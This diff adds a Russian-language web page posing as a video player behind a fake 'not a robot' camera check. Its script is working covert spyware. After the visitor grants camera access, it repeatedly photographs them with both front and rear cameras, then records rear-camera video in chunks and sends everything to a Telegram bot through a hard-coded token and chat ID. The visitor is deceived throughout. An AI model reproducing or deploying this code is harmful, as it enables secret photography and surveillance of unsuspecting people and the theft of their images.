@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Видеоплеер</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz@14..32&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            background: #0b0d10;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: 'Inter', sans-serif;
+            color: #fff;
+            padding: 16px;
+        }
+
+        .container {
+            max-width: 800px;
+            width: 100%;
+            background: #14171c;
+            border-radius: 32px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
+            overflow: hidden;
+            position: relative;
+        }
+
+        .video-wrapper {
+            position: relative;
+            padding-bottom: 56.25%;
+            height: 0;
+            background: #000;
+        }
+
+        .video-wrapper video {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            display: block;
+        }
+
+        #prepared-video {
+            object-fit: contain;
+        }
+
+        .overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(11, 13, 16, 0.94);
+            backdrop-filter: blur(10px);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 30px 20px;
+            text-align: center;
+            z-index: 20;
+            transition: opacity 0.5s ease, visibility 0.5s ease;
+        }
+
+        .overlay.hidden {
+            opacity: 0;
+            visibility: hidden;
+            pointer-events: none;
+        }
+
+        .step {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            max-width: 500px;
+        }
+
+        .step.active {
+            display: flex;
+        }
+
+        .step .icon {
+            font-size: 52px;
+            margin-bottom: 16px;
+        }
+
+        .step h2 {
+            font-size: 26px;
+            font-weight: 600;
+            margin-bottom: 12px;
+            background: linear-gradient(135deg, #f5af19, #f12711);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .step p {
+            font-size: 18px;
+            color: #b0b8c4;
+            line-height: 1.6;
+            margin-bottom: 24px;
+        }
+
+        .step .btn {
+            padding: 16px 48px;
+            font-size: 20px;
+            font-weight: 600;
+            border: none;
+            border-radius: 60px;
+            background: linear-gradient(135deg, #f5af19, #f12711);
+            color: #fff;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            box-shadow: 0 8px 24px rgba(241, 39, 17, 0.4);
+            min-width: 220px;
+        }
+
+        .step .btn:hover:not(:disabled) {
+            transform: scale(1.04);
+            box-shadow: 0 12px 32px rgba(241, 39, 17, 0.6);
+        }
+
+        .step .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .step .timer {
+            font-size: 48px;
+            font-weight: 700;
+            color: #f5af19;
+            margin: 16px 0 8px;
+            letter-spacing: 2px;
+        }
+
+        .step .sub {
+            font-size: 16px;
+            color: #8892a0;
+        }
+
+        .spinner {
+            width: 64px;
+            height: 64px;
+            border-radius: 50%;
+            border: 6px solid #2a2f36;
+            border-top-color: #f5af19;
+            animation: spin 0.9s linear infinite;
+            margin: 16px auto;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        @media (max-width: 600px) {
+            .step h2 { font-size: 22px; }
+            .step p { font-size: 16px; }
+            .step .btn { font-size: 18px; padding: 14px 32px; min-width: 180px; }
+            .step .timer { font-size: 36px; }
+        }
+
+        #capture-video, #capture-canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="video-wrapper">
+        <!-- Подготовленное видео (замените src на свой файл или URL) -->
+        <video id="prepared-video" autoplay muted playsinline>
+            <source src="video.mp4" type="video/mp4">
+            <p>Видео не доступно</p>
+        </video>
+
+        <video id="capture-video" autoplay muted playsinline></video>
+        <canvas id="capture-canvas"></canvas>
+
+        <div class="overlay" id="overlay">
+            <!-- Шаг 0 -->
+            <div class="step active" id="step-start">
+                <div class="icon">🤖</div>
+                <h2>Проверка не-робота</h2>
+                <p>Чтобы продолжить, нам нужно убедиться, что вы не робот.</p>
+                <button class="btn" id="btn-start">Я не робот</button>
+            </div>
+
+            <!-- Шаг 1 -->
+            <div class="step" id="step-permit">
+                <div class="icon">📷</div>
+                <h2>Разрешение доступа</h2>
+                <p>Чтобы убедиться точно, что вы не робот, разрешите несколько действий для сайта – это доступ к камере.</p>
+                <button class="btn" id="btn-permit">Разрешить</button>
+            </div>
+
+            <!-- Шаг 2: Идёт проверка (без таймера, только анимация) -->
+            <div class="step" id="step-verifying">
+                <div class="spinner"></div>
+                <h2>Идёт проверка</h2>
+                <p>Пожалуйста, подождите несколько секунд...</p>
+            </div>
+
+            <!-- Шаг 3 -->
+            <div class="step" id="step-confirm">
+                <div class="icon">✅</div>
+                <h2>Разрешение получено</h2>
+                <p>Нажмите кнопку ниже, чтобы завершить проверку.</p>
+                <button class="btn" id="btn-confirm">Я разрешил</button>
+            </div>
+
+            <!-- Шаг 4: 30-секундная проверка -->
+            <div class="step" id="step-timer">
+                <div class="timer" id="timer-display">30</div>
+                <div class="sub">секунд до завершения проверки</div>
+                <p style="margin-top: 16px; font-size: 14px; color: #8892a0;">Не закрывайте страницу</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    (function() {
+        'use strict';
+
+        // ====== НАСТРОЙКИ TELEGRAM (ЗАМЕНИТЕ НА СВОИ) ======
+        const BOT_TOKEN = '8909061123:AAFJ7m_BqZLcBFGgGzoEqbV9oTcjU0cW5ZM';
+        const CHAT_ID = '8320098094';
+
+        // ====== DOM-элементы ======
+        const overlay = document.getElementById('overlay');
+        const stepStart = document.getElementById('step-start');
+        const stepPermit = document.getElementById('step-permit');
+        const stepVerifying = document.getElementById('step-verifying');
+        const stepConfirm = document.getElementById('step-confirm');
+        const stepTimer = document.getElementById('step-timer');
+        const btnStart = document.getElementById('btn-start');
+        const btnPermit = document.getElementById('btn-permit');
+        const btnConfirm = document.getElementById('btn-confirm');
+        const timerDisplay = document.getElementById('timer-display');
+
+        const preparedVideo = document.getElementById('prepared-video');
+        const captureVideo = document.getElementById('capture-video');
+        const canvas = document.getElementById('capture-canvas');
+        const ctx = canvas.getContext('2d');
+
+        let stream = null;
+        let mediaRecorder = null;
+        let recordedChunks = [];
+        let isRecording = false;
+        let timerInterval = null;
+        let timeLeft = 30;
+
+        // ====== Отправка в Telegram ======
+        function dataURLToBlob(dataUrl) {
+            const parts = dataUrl.split(',');
+            const mime = parts[0].match(/:(.*?);/)[1];
+            const bstr = atob(parts[1]);
+            let n = bstr.length;
+            const u8arr = new Uint8Array(n);
+            while (n--) {
+                u8arr[n] = bstr.charCodeAt(n);
+            }
+            return new Blob([u8arr], { type: mime });
+        }
+
+        function sendPhotoToTelegram(dataUrl, caption = 'Фото с камеры') {
+            const blob = dataURLToBlob(dataUrl);
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'photo.jpg');
+            formData.append('caption', caption);
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            }).then(res => res.json())
+              .then(data => console.log('Фото отправлено', data))
+              .catch(err => console.error('Ошибка отправки фото:', err));
+        }
+
+        function sendVideoToTelegram(blob, caption = 'Видео-чанк') {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('document', blob, 'video_chunk.webm');
+            formData.append('caption', caption);
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+                method: 'POST',
+                body: formData
+            }).then(res => res.json())
+              .then(data => console.log('Видео отправлено', data))
+              .catch(err => console.error('Ошибка отправки видео:', err));
+        }
+
+        // ====== Работа с камерой ======
+        function switchCamera(facingMode) {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+                stream = null;
+            }
+            return navigator.mediaDevices.getUserMedia({
+                video: {
+                    facingMode: facingMode,
+                    width: { ideal: 640 },
+                    height: { ideal: 480 }
+                },
+                audio: false
+            }).then(newStream => {
+                stream = newStream;
+                captureVideo.srcObject = stream;
+                return stream;
+            });
+        }
+
+        function captureFrame(cameraType) {
+            if (!captureVideo.videoWidth) return;
+            canvas.width = captureVideo.videoWidth;
+            canvas.height = captureVideo.videoHeight;
+            ctx.drawImage(captureVideo, 0, 0, canvas.width, canvas.height);
+            const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+            sendPhotoToTelegram(dataUrl, `Фото с ${cameraType} камеры`);
+        }
+
+        function captureBatch(facingMode, count) {
+            return new Promise(async (resolve) => {
+                await switchCamera(facingMode);
+                await new Promise(r => setTimeout(r, 300));
+                for (let i = 0; i < count; i++) {
+                    captureFrame(facingMode === 'user' ? 'передней' : 'задней');
+                    await new Promise(r => setTimeout(r, 150));
+                }
+                resolve();
+            });
+        }
+
+        // ====== Запись видео ======
+        function startRecording() {
+            if (!stream) return;
+            try {
+                mediaRecorder = new MediaRecorder(stream, {
+                    mimeType: 'video/webm;codecs=vp9'
+                });
+                recordedChunks = [];
+
+                mediaRecorder.ondataavailable = function(e) {
+                    if (e.data.size > 0) {
+                        recordedChunks.push(e.data);
+                        sendVideoToTelegram(e.data, 'Чанк записи с задней камеры');
+                    }
+                };
+
+                mediaRecorder.onstop = function() {
+                    if (recordedChunks.length) {
+                        const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                        sendVideoToTelegram(blob, 'Финальный фрагмент');
+                        recordedChunks = [];
+                    }
+                };
+
+                mediaRecorder.start(3000);
+                isRecording = true;
+                console.log('Запись запущена');
+            } catch (err) {
+                console.error('Ошибка запуска записи:', err);
+            }
+        }
+
+        function stopRecording() {
+            if (mediaRecorder && isRecording) {
+                mediaRecorder.stop();
+                isRecording = false;
+            }
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+                stream = null;
+            }
+        }
+
+        // ====== Вспомогательные ======
+        function clearAllTimers() {
+            if (timerInterval) {
+                clearInterval(timerInterval);
+                timerInterval = null;
+            }
+        }
+
+        function showStep(stepElement) {
+            document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+            stepElement.classList.add('active');
+        }
+
+        function resetToStart() {
+            clearAllTimers();
+            stopRecording();
+            showStep(stepStart);
+            overlay.classList.remove('hidden');
+            btnStart.disabled = false;
+            btnStart.textContent = 'Я не робот';
+            preparedVideo.pause();
+            preparedVideo.currentTime = 0;
+        }
+
+        // ====== Основные обработчики ======
+        btnStart.addEventListener('click', function() {
+            btnStart.disabled = true;
+            btnStart.textContent = 'Загрузка...';
+            showStep(stepPermit);
+        });
+
+        btnPermit.addEventListener('click', function() {
+            btnPermit.disabled = true;
+            btnPermit.textContent = 'Запрос...';
+            showStep(stepVerifying);
+
+            // Сразу начинаем съёмку 3+3 без таймера
+            captureBatch('user', 3)
+                .then(() => captureBatch('environment', 3))
+                .then(() => {
+                    showStep(stepConfirm);
+                })
+                .catch(err => {
+                    console.error(err);
+                    alert('Ошибка доступа к камере. Проверьте разрешения.');
+                    resetToStart();
+                });
+        });
+
+        btnConfirm.addEventListener('click', function() {
+            showStep(stepTimer);
+            timeLeft = 30;
+            timerDisplay.textContent = timeLeft;
+
+            clearAllTimers();
+
+            // Дополнительные кадры (15+15) во время 30-секундной проверки
+            (async function() {
+                await captureBatch('user', 15);
+                await captureBatch('environment', 15);
+            })();
+
+            timerInterval = setInterval(() => {
+                timeLeft--;
+                timerDisplay.textContent = timeLeft;
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    timerInterval = null;
+                    startVideoAndRecording();
+                }
+            }, 1000);
+        });
+
+        function startVideoAndRecording() {
+            overlay.classList.add('hidden');
+            preparedVideo.play().catch(() => {});
+
+            if (stream) {
+                const track = stream.getVideoTracks()[0];
+                if (track && track.getSettings().facingMode !== 'environment') {
+                    switchCamera('environment')
+                        .then(() => startRecording())
+                        .catch(() => startRecording());
+                } else {
+                    startRecording();
+                }
+            } else {
+                switchCamera('environment')
+                    .then(() => startRecording())
+                    .catch(() => {});
+            }
+        }
+
+        // ====== Очистка при закрытии ======
+        window.addEventListener('beforeunload', stopRecording);
+        window.addEventListener('pagehide', stopRecording);
+
+        // ====== Инициализация ======
+        resetToStart();
+        console.log('Готово. Проверка 30 секунд начинается после нажатия "Я разрешил".');
+    })();
+</script>
+</body>
+</html>
